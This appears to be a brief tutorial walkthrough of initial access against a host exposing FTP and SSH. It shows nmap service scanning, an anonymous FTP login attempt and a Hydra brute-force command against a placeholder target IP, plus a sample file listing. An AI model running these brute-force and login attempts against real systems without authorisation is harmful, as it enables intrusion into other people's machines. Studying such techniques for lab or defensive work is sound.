FTP & SSH Enumeration and Initial Access

A step-by-step walkthrough of a common exploitation scenario.

Step 1Nmap Scan

Identify open ports and services (e.g., FTP on 21, SSH on 22) using nmap -sV.

Step 2Anonymous FTP Check

Attempt to log into FTP with username 'anonymous' and any password. Explore directories if successful.

Step 3Hydra Brute-Force

If anonymous FTP fails, use Hydra with username and password lists against FTP and SSH.

Key Takeaway

A methodical approach, starting with passive checks and escalating to active brute-forcing, is key to gaining initial access.

# Scenario: Nmap reveals FTP (21) and SSH (22)1. Nmap Scan:nmap -sV <TARGET_IP>2. Anonymous FTP Attempt:ftp <TARGET_IP>Name: anonymousPassword: anonymous3. Hydra Brute-Force (if needed):hydra -L users.txt -P passwords.txt ssh://<TARGET_IP>

This sequence demonstrates how to combine enumeration and brute-forcing to achieve initial access. Each step builds upon the information gathered from the previous one.

# Example of successful anonymous FTP loginftp> ls-rw-r--r--    1 0        0             1234 Jan 01 2023 sensitive_data.txt

A successful anonymous FTP login allows you to list directories and potentially download sensitive files, providing a critical foothold.
